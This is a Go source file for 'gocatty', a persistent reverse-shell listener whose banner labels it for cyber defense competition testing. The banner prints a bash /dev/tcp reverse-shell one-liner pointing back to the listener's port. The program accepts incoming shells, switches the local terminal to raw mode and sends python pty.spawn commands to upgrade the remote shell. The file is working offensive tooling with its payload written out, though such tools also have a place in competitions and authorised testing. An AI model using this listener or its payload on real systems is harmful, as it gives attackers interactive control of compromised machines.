// gocatty.go
package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/term"
)

const (
	defaultPort = 1234
	colorBanner = "\033[35m"
	colorAccent = "\033[36m"
	colorCmd    = "\033[32m"
	colorExec   = "\033[31m"
	colorFlag   = "\033[33m"
	colorReset  = "\033[0m"
)

type ifaceAddress struct {
	Name string
	IP   string
}

type listenerOptions struct {
	Script        bool
	SkipBootstrap bool
	LocalEcho     bool
	NoRaw         bool
	CRLF          bool
}

func main() {
	fmt.Println(colorBanner + "For C C D C competition testing only" + colorReset)
	fmt.Println(colorAccent + "" + colorReset)
	fmt.Println(colorAccent + "Change from zsh to bash to send the shell:" + colorReset)
	fmt.Println(colorCmd + "bash" + colorReset)
	fmt.Println(colorExec + "exec 3<>/dev/tcp/IP/1234" + colorReset)
	fmt.Println(colorExec + "exec 0<&3 1>&3 2>&3" + colorReset)
	fmt.Println(colorAccent + "Usage: ./gocatty [flags] [port]" + colorReset)
	fmt.Println(colorAccent + "Available flags:" + colorReset)
	printFlag("  --listener PORT", "explicit listen port (alternative to positional [port])")
	printFlag("  --windows", "disables remote PTY bootstrap and enables local echo")
	printFlag("  --no-pty / --skip-pty", "do not send remote bootstrap commands")
	printFlag("  --local-echo", "show what you type even if the remote does not echo")
	printFlag("  --no-raw / --cooked", "do not put your local terminal in raw mode (useful for some Windows shells)")
	printFlag("  --crlf", "translate Enter to CRLF when sending (helpful for some Windows shells)")
	port, opts, err := parseArgs(os.Args[1:])
	if err != nil {
		fmt.Fprintln(os.Stderr, "error al leer el puerto:", err)
		return
	}

	if opts.Script {
		if err := runScript(port); err != nil {
			fmt.Fprintln(os.Stderr, "error ejecutando script:", err)
			return
		}
	}

	runPersistentListener(port, opts)
}

func printFlag(flagName, description string) {
	fmt.Println(colorFlag + flagName + colorReset + colorAccent + ": " + description + colorReset)
}

func runPersistentListener(port string, opts listenerOptions) {
	for {
		if err := handleSingleConnection(port, opts); err != nil {
			fmt.Fprintln(os.Stderr, "listener error:", err)
		}
		fmt.Println("Reiniciando listener...")
		time.Sleep(time.Second)
	}
}

func handleSingleConnection(port string, opts listenerOptions) error {
	addr := "0.0.0.0:" + port
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("listen error: %w", err)
	}
	defer ln.Close()

	fmt.Println("Listening on", addr)
	printLocalIPs()

	conn, err := ln.Accept()
	if err != nil {
		return fmt.Errorf("accept error: %w", err)
	}
	defer conn.Close()

	fd := int(os.Stdin.Fd())
	var (
		restoreTTY func()
	)
	if !opts.NoRaw && term.IsTerminal(fd) {
		// Poner tu TTY en raw mode (equivalente a: stty raw -echo)
		oldState, err := term.MakeRaw(fd)
		if err != nil {
			return fmt.Errorf("MakeRaw error: %w", err)
		}
		restoreTTY = func() { _ = term.Restore(fd, oldState) }
		defer restoreTTY()

		// Restaurar TTY también si te sales con Ctrl+C / kill
		sigc := make(chan os.Signal, 1)
		quit := make(chan struct{})
		signal.Notify(sigc, os.Interrupt, syscall.SIGTERM)
		defer func() {
			signal.Stop(sigc)
			close(quit)
		}()
		go func() {
			select {
			case <-sigc:
				restoreTTY()
				fmt.Println()
				os.Exit(0)
			case <-quit:
				return
			}
		}()
	}

	ra := conn.RemoteAddr().String()
	fmt.Println("Connection received on", ra)
	if !opts.SkipBootstrap {
		bootstrapRemoteShell(conn)
	}

	// Pipe bidireccional
	done := make(chan struct{}, 2)

	go func() {
		var input io.Reader = os.Stdin
		if opts.LocalEcho {
			input = io.TeeReader(os.Stdin, os.Stdout)
		}
		if opts.CRLF {
			input = newCRLFReader(input)
		}
		_, _ = io.Copy(conn, input)
		done <- struct{}{}
	}()
	go func() {
		_, _ = io.Copy(os.Stdout, conn)
		done <- struct{}{}
	}()

	<-done
	return nil
}

// bootstrapRemoteShell intenta crear un PTY remoto y configurar TERM automáticamente.
func bootstrapRemoteShell(conn net.Conn) {
	commands := []string{
		`python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'`,
		"export TERM=xterm-256color",
	}

	fmt.Println("Enviando comandos para inicializar PTY remoto...")
	for _, cmd := range commands {
		if _, err := fmt.Fprintf(conn, "%s\n", cmd); err != nil {
			fmt.Fprintln(os.Stderr, "no se pudieron enviar comandos de inicializacion:", err)
			return
		}
		// Pequeña espera para dar tiempo a que la shell remota procese el comando.
		time.Sleep(250 * time.Millisecond)
	}
}

func parseArgs(args []string) (string, listenerOptions, error) {
	cleaned := make([]string, 0, len(args))
	opts := listenerOptions{}
	var explicitPort string

	for i := 0; i < len(args); i++ {
		arg := args[i]
		switch arg {
		case "-script", "--script":
			opts.Script = true
		case "--no-pty", "--skip-pty":
			opts.SkipBootstrap = true
		case "--local-echo":
			opts.LocalEcho = true
		case "--no-raw", "--cooked":
			opts.NoRaw = true
		case "--crlf":
			opts.CRLF = true
		case "--windows":
			opts.SkipBootstrap = true
			opts.LocalEcho = true
			// Windows shells often behave better without local raw mode.
			opts.NoRaw = true
		case "--listener":
			// Support the flag shown in the banner help: --listener PORT
			if i+1 >= len(args) {
				return "", listenerOptions{}, fmt.Errorf("--listener requiere un puerto")
			}
			i++
			explicitPort = args[i]
		default:
			// Support --listener=PORT as well.
			if strings.HasPrefix(arg, "--listener=") {
				explicitPort = strings.TrimPrefix(arg, "--listener=")
				continue
			}
			cleaned = append(cleaned, arg)
		}
	}

	if explicitPort != "" {
		if err := validatePort(explicitPort); err != nil {
			return "", listenerOptions{}, err
		}
		// If the user also passed a positional port, treat as an error to avoid ambiguity.
		if len(cleaned) != 0 {
			return "", listenerOptions{}, fmt.Errorf("no combines --listener con puerto posicional: %v", cleaned)
		}
		return explicitPort, opts, nil
	}

	switch len(cleaned) {
	case 0:
		return strconv.Itoa(defaultPort), opts, nil
	case 1:
		if err := validatePort(cleaned[0]); err != nil {
			return "", listenerOptions{}, err
		}
		return cleaned[0], opts, nil
	default:
		return "", listenerOptions{}, fmt.Errorf("solo se admite un argumento de puerto, recibidos: %v", cleaned)
	}
}

// crlfReader translates newline bytes to CRLF for better compatibility with some Windows shells.
// It also collapses an incoming CRLF sequence to a single CRLF (i.e., doesn't double it).
type crlfReader struct {
	r      io.Reader
	buf    []byte
	lastCR bool
}

func newCRLFReader(r io.Reader) *crlfReader {
	return &crlfReader{
		r:   r,
		buf: make([]byte, 0, 4096),
	}
}

func (c *crlfReader) Read(p []byte) (int, error) {
	// Serve pending transformed bytes first.
	if len(c.buf) > 0 {
		n := copy(p, c.buf)
		c.buf = c.buf[n:]
		return n, nil
	}

	tmp := make([]byte, 1024)
	n, err := c.r.Read(tmp)
	if n > 0 {
		for i := 0; i < n; i++ {
			b := tmp[i]
			switch b {
			case '\r':
				c.buf = append(c.buf, '\r', '\n')
				c.lastCR = true
			case '\n':
				// If we already emitted CRLF for a preceding CR, skip this LF.
				if c.lastCR {
					c.lastCR = false
					continue
				}
				c.buf = append(c.buf, '\r', '\n')
			default:
				c.lastCR = false
				c.buf = append(c.buf, b)
			}
		}
		// Now that c.buf has data, serve it.
		n2 := copy(p, c.buf)
		c.buf = c.buf[n2:]
		return n2, nil
	}
	return 0, err
}

func validatePort(value string) error {
	port, err := strconv.Atoi(value)
	if err != nil {
		return fmt.Errorf("puerto invalido %q: %w", value, err)
	}
	if port <= 0 || port > 65535 {
		return fmt.Errorf("el puerto debe estar entre 1 y 65535")
	}
	return nil
}

func runScript(port string) error {
	cmd := exec.Command("./script", port)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	return cmd.Run()
}

func printLocalIPs() {
	addrs := availableIPv4Addresses()
	if len(addrs) == 0 {
		fmt.Println("No se detectaron interfaces IPv4 activas.")
		return
	}

	maxIface := len("Interface")
	maxIP := len("IP Address")
	for _, addr := range addrs {
		if len(addr.Name) > maxIface {
			maxIface = len(addr.Name)
		}
		if len(addr.IP) > maxIP {
			maxIP = len(addr.IP)
		}
	}

	border := fmt.Sprintf("+-%s-+-%s-+", strings.Repeat("-", maxIface), strings.Repeat("-", maxIP))
	fmt.Println(border)
	fmt.Printf("| %-*s | %-*s |\n", maxIface, "Interface", maxIP, "IP Address")
	fmt.Println(border)
	for _, addr := range addrs {
		fmt.Printf("| %-*s | %-*s |\n", maxIface, addr.Name, maxIP, addr.IP)
	}
	fmt.Println(border)
}

func availableIPv4Addresses() []ifaceAddress {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil
	}
	var addrs []ifaceAddress
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		ifaceAddrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range ifaceAddrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if v4 := ip.To4(); v4 != nil {
				addrs = append(addrs, ifaceAddress{Name: iface.Name, IP: v4.String()})
			}
		}
	}
	return addrs
}
